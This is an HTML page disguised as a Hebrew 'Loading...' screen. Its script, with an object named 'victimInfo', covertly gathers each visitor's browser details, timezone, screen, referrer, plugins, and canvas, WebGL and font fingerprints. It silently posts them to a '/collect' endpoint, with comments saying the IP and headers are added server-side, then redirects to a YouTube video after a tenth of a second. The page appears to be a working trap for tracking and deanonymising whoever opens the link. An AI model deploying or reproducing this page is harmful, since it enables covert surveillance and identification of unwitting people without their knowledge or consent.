<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { font-size: 24px; }
    </style>
</head>
<body>
    <div class="loader">טוען...</div>
    <script>
        // איסוף מידע מקיף על המבקר
        const victimInfo = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language || navigator.languages[0],
            platform: navigator.platform,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            referrer: document.referrer || 'direct',
            url: window.location.href,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            canvasFingerprint: (function() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint test', 2, 2);
                return canvas.toDataURL();
            })(),
            webglFingerprint: (function() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return debugInfo ? {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        } : 'no_webgl';
                    }
                } catch(e) { return 'error'; }
            })(),
            plugins: Array.from(navigator.plugins).map(p => p.name),
            fonts: (function() {
                const testStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                const test = document.createElement('span');
                test.style.fontSize = '72px';
                test.style.visibility = 'hidden';
                test.innerHTML = testStr;
                document.body.appendChild(test);
                const defaultWidth = {};
                const defaultHeight = {};
                ['monospace', 'serif', 'sans-serif'].forEach(family => {
                    test.style.fontFamily = family;
                    defaultWidth[family] = test.offsetWidth;
                    defaultHeight[family] = test.offsetHeight;
                });
                document.body.removeChild(test);
                return { defaultWidth, defaultHeight };
            })(),
            ip: 'fetching...', // יתווסף בצד השרת
            headers: 'server-side' // יתווסף בצד השרת
        };

        // שליחת המידע לשרת
        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(victimInfo)
        }).catch(() => {}); // שקט גם אם נכשל

        // הסטה מיידית אחרי 0.1 שניות
        setTimeout(() => {
            window.location.href = 'https://www.youtube.com/watch?v=9E6b3swbnWg';
        }, 100);
    </script>
</body>
</html>
